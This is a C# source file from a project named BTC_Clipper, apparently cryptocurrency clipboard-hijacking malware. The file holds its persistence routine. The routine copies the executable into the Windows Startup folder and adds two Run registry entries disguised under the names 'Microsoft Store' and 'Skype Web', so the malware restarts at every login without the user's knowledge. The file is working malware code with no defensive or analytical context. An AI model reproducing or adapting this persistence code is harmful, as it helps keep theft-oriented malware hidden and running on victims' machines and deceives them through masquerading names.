using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BTC_Clipper
{
    class autorestart
    {
        public static void startup()
        {
            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string exename = System.AppDomain.CurrentDomain.FriendlyName;
            try
            {
                File.Copy(exepath, Path.Combine(startuppath, Path.GetFileName(exepath)));
            }
            catch
            {

            }
            RegistryKey key1 = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);            //REGISTRY KEY FOR CURRENT EXE LOCATION
             key1.SetValue("Microsoft Store", Application.ExecutablePath);


            RegistryKey key2 = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);          //REGISTRY KEY FOR STARTUP PATH ; MAKE SURE 2 VALUE NAMES
            key2.SetValue("Skype Web", startuppath+"\\"+exename);
        }
    }
}
